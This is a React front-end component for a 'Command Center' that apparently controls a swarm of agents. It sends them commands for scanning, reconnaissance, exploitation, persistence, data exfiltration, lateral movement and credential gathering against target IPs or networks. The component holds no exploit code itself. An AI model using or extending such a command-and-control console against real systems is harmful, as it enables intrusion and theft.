'use client';
import { useState, useEffect, useCallback } from 'react';
import { CommandLineIcon, PlayIcon, ArrowPathIcon, SignalIcon } from '@heroicons/react/24/outline';
import { SwarmAgent } from '@/types';
import { fetchSwarmAgents, fetchSwarmStats, sendCommand, scaleSwarm, resetSwarm, statusColor, platformColor } from '@/lib/api';

const COMMAND_TYPES = [
  { id: 'scan',        label: '🔍 Scan',         desc: 'Network scan for open ports and services' },
  { id: 'recon',       label: '📡 Recon',        desc: 'Reconnaissance and target enumeration' },
  { id: 'exploit',     label: '💥 Exploit',      desc: 'Exploit known vulnerabilities on target' },
  { id: 'persist',     label: '🔒 Persist',      desc: 'Establish persistence on target system' },
  { id: 'exfil',       label: '📤 Exfil',        desc: 'Data exfiltration from target' },
  { id: 'lateral_move',label: '↔ Lateral Move', desc: 'Move laterally through network' },
  { id: 'gather',      label: '📊 Gather',       desc: 'Gather system intelligence and credentials' },
  { id: 'stop',        label: '⏹ Stop',          desc: 'Stop all agent tasks' },
];

interface CmdResult {
  id: string;
  command: string;
  agentId?: string;
  status: 'success' | 'error' | 'pending';
  message: string;
  timestamp: Date;
}

export default function CommandCenter() {
  const [agents, setAgents] = useState<SwarmAgent[]>([]);
  const [stats, setStats] = useState<{ total_operations: number; successful_operations: number; active_agents: number } | null>(null);
  const [selectedCmd, setSelectedCmd] = useState('scan');
  const [selectedAgent, setSelectedAgent] = useState('all');
  const [target, setTarget] = useState('');
  const [results, setResults] = useState<CmdResult[]>([]);
  const [loading, setLoading] = useState(false);
  const [scaleCount, setScaleCount] = useState(8);

  const fetchAll = useCallback(async () => {
    try {
      const [rawAgents, rawStats] = await Promise.all([fetchSwarmAgents(), fetchSwarmStats()]);
      setAgents(rawAgents);
      setStats(rawStats);
    } catch { /* silent */ }
  }, []);

  useEffect(() => {
    fetchAll();
    const interval = setInterval(fetchAll, 5000);
    return () => clearInterval(interval);
  }, [fetchAll]);

  const addResult = (cmd: string, agentId: string | undefined, status: 'success' | 'error' | 'pending', message: string) => {
    const r: CmdResult = { id: Math.random().toString(36).slice(2), command: cmd, agentId, status, message, timestamp: new Date() };
    setResults(prev => [r, ...prev].slice(0, 50));
  };

  const handleSend = async () => {
    setLoading(true);
    const agentId = selectedAgent === 'all' ? undefined : selectedAgent;
    addResult(selectedCmd, agentId, 'pending', `Sending '${selectedCmd}'${agentId ? ` to ${agentId.slice(-8)}` : ' to all agents'}...`);
    try {
      const res = await sendCommand({ command: selectedCmd, agent_id: agentId, target: target || undefined });
      addResult(selectedCmd, agentId, 'success', `Command sent successfully${res.result ? `: ${res.result}` : ''}`);
      fetchAll();
    } catch (err) {
      addResult(selectedCmd, agentId, 'error', `Failed: ${err instanceof Error ? err.message : 'Unknown error'}`);
    } finally {
      setLoading(false);
    }
  };

  const handleScale = async () => {
    setLoading(true);
    try {
      await scaleSwarm(scaleCount);
      addResult('scale', undefined, 'success', `Swarm scaled to ${scaleCount} agents`);
      fetchAll();
    } catch (err) {
      addResult('scale', undefined, 'error', `Scale failed: ${err instanceof Error ? err.message : 'Unknown'}`);
    } finally {
      setLoading(false);
    }
  };

  const handleReset = async () => {
    if (!confirm('Reset the entire swarm? This will clear all agents and operations.')) return;
    try {
      await resetSwarm();
      addResult('reset', undefined, 'success', 'Swarm reset complete');
      fetchAll();
    } catch (err) {
      addResult('reset', undefined, 'error', `Reset failed: ${err instanceof Error ? err.message : 'Unknown'}`);
    }
  };

  return (
    <div className="space-y-6">
      <div>
        <h2 className="text-xl font-bold text-white">Command Center</h2>
        <p className="text-sm text-gray-400 mt-0.5">Direct swarm control · {agents.length} agents online</p>
      </div>

      {/* Live Stats */}
      {stats && (
        <div className="grid grid-cols-3 gap-3">
          {[
            { label: 'Active Agents', value: stats.active_agents, color: 'text-green-400' },
            { label: 'Total Operations', value: stats.total_operations, color: 'text-white' },
            { label: 'Successful', value: stats.successful_operations, color: 'text-serverroot-400' },
          ].map(item => (
            <div key={item.label} className="cyber-card py-3 text-center">
              <p className="text-xs text-gray-500 uppercase">{item.label}</p>
              <p className={`text-2xl font-bold mt-1 ${item.color}`}>{item.value}</p>
            </div>
          ))}
        </div>
      )}

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Command Panel */}
        <div className="cyber-card space-y-5">
          <h3 className="text-base font-semibold text-white flex items-center">
            <CommandLineIcon className="w-5 h-5 mr-2 text-serverroot-400" />
            Send Command
          </h3>

          {/* Command Type */}
          <div>
            <label className="text-xs text-gray-400 uppercase tracking-wider block mb-2">Command Type</label>
            <div className="grid grid-cols-2 gap-2">
              {COMMAND_TYPES.map(cmd => (
                <button
                  key={cmd.id}
                  onClick={() => setSelectedCmd(cmd.id)}
                  className={`text-left px-3 py-2 rounded-lg border text-sm transition-all ${
                    selectedCmd === cmd.id
                      ? 'border-serverroot-500 bg-serverroot-500/10 text-serverroot-400'
                      : 'border-gray-700 bg-gray-800/50 text-gray-400 hover:border-gray-600 hover:text-white'
                  }`}
                >
                  <div className="font-medium text-xs">{cmd.label}</div>
                  <div className="text-xs text-gray-600 mt-0.5 truncate">{cmd.desc}</div>
                </button>
              ))}
            </div>
          </div>

          {/* Target Agent */}
          <div>
            <label className="text-xs text-gray-400 uppercase tracking-wider block mb-2">Target Agent</label>
            <select
              value={selectedAgent}
              onChange={e => setSelectedAgent(e.target.value)}
              className="w-full bg-gray-800 border border-gray-700 rounded-lg px-3 py-2 text-white text-sm focus:outline-none focus:border-serverroot-500"
            >
              <option value="all">All Agents ({agents.length})</option>
              {agents.map(a => (
                <option key={a.id} value={a.id}>{a.hostname} — {a.platform} [{a.id.slice(-8)}]</option>
              ))}
            </select>
          </div>

          {/* Optional Target */}
          <div>
            <label className="text-xs text-gray-400 uppercase tracking-wider block mb-2">Target IP / Network (optional)</label>
            <input
              type="text"
              value={target}
              onChange={e => setTarget(e.target.value)}
              placeholder="e.g. 192.168.1.0/24 or 10.0.0.1"
              className="w-full bg-gray-800 border border-gray-700 rounded-lg px-3 py-2 text-white text-sm font-mono placeholder-gray-600 focus:outline-none focus:border-serverroot-500"
            />
          </div>

          <button
            onClick={handleSend}
            disabled={loading}
            className="w-full py-3 bg-serverroot-600 hover:bg-serverroot-500 disabled:opacity-50 disabled:cursor-not-allowed text-white font-semibold rounded-lg flex items-center justify-center space-x-2 transition-colors"
          >
            <PlayIcon className="w-5 h-5" />
            <span>{loading ? 'Sending...' : `Execute: ${selectedCmd}`}</span>
          </button>
        </div>

        {/* Swarm Management + Output */}
        <div className="space-y-4">
          {/* Scale */}
          <div className="cyber-card">
            <h3 className="text-sm font-semibold text-gray-300 mb-3">⚙ Swarm Management</h3>
            <div className="flex items-center space-x-3 mb-3">
              <label className="text-xs text-gray-400">Scale swarm to:</label>
              <input
                type="number" value={scaleCount} min={1} max={50}
                onChange={e => setScaleCount(Number(e.target.value))}
                className="w-16 bg-gray-800 border border-gray-700 rounded px-2 py-1 text-white text-sm"
              />
              <button onClick={handleScale} disabled={loading}
                className="px-3 py-1.5 bg-blue-600 hover:bg-blue-500 text-white rounded text-sm font-medium transition-colors disabled:opacity-50">
                Scale
              </button>
              <button onClick={fetchAll}
                className="px-3 py-1.5 bg-gray-700 hover:bg-gray-600 text-gray-300 rounded text-sm transition-colors">
                <ArrowPathIcon className="w-4 h-4" />
              </button>
              <button onClick={handleReset}
                className="px-3 py-1.5 bg-red-800/40 hover:bg-red-700/40 text-red-400 border border-red-700/40 rounded text-sm transition-colors">
                Reset
              </button>
            </div>
          </div>

          {/* Command Output */}
          <div className="cyber-card flex-1">
            <h3 className="text-sm font-semibold text-gray-300 mb-3 flex items-center justify-between">
              <span>📟 Command Output</span>
              {results.length > 0 && (
                <button onClick={() => setResults([])} className="text-xs text-gray-600 hover:text-gray-400">Clear</button>
              )}
            </h3>
            <div className="space-y-2 max-h-80 overflow-y-auto font-mono text-xs">
              {results.length === 0 ? (
                <p className="text-gray-600 text-center py-8">No commands sent yet</p>
              ) : (
                results.map(r => (
                  <div key={r.id} className={`flex items-start space-x-2 py-1.5 px-2 rounded ${
                    r.status === 'success' ? 'bg-green-900/10 border border-green-900/20'
                    : r.status === 'error' ? 'bg-red-900/10 border border-red-900/20'
                    : 'bg-gray-800/30 border border-gray-800'
                  }`}>
                    <span>{r.status === 'success' ? '✓' : r.status === 'error' ? '✗' : '⏳'}</span>
                    <div className="flex-1 min-w-0">
                      <span className={r.status === 'success' ? 'text-green-400' : r.status === 'error' ? 'text-red-400' : 'text-yellow-400'}>
                        [{r.command.toUpperCase()}]{r.agentId ? ` → ${r.agentId.slice(-8)}` : ''}
                      </span>
                      <span className="text-gray-400 ml-2">{r.message}</span>
                    </div>
                    <span className="text-gray-700 shrink-0">{r.timestamp.toLocaleTimeString()}</span>
                  </div>
                ))
              )}
            </div>
          </div>
        </div>
      </div>

      {/* Agent Quick Reference */}
      {agents.length > 0 && (
        <div className="cyber-card">
          <h3 className="text-sm font-semibold text-gray-300 mb-3">🖥 Online Agents ({agents.length})</h3>
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-2">
            {agents.map(agent => (
              <div key={agent.id} className="flex items-center justify-between bg-gray-900/50 rounded px-3 py-2 border border-gray-800">
                <div className="flex items-center space-x-2">
                  <div className={`w-1.5 h-1.5 rounded-full ${agent.status === 'active' ? 'bg-green-400' : 'bg-gray-600'}`}></div>
                  <span className="text-xs text-white font-mono">{agent.hostname}</span>
                  <span className={`text-xs ${platformColor(agent.platform)}`}>{agent.platform}</span>
                </div>
                <div className="flex items-center space-x-2">
                  <span className={`text-xs px-1.5 py-0.5 rounded border ${statusColor(agent.status)}`}>{agent.status}</span>
                  <button onClick={() => { setSelectedAgent(agent.id); }}
                    className="text-xs text-gray-600 hover:text-serverroot-400 transition-colors">select</button>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}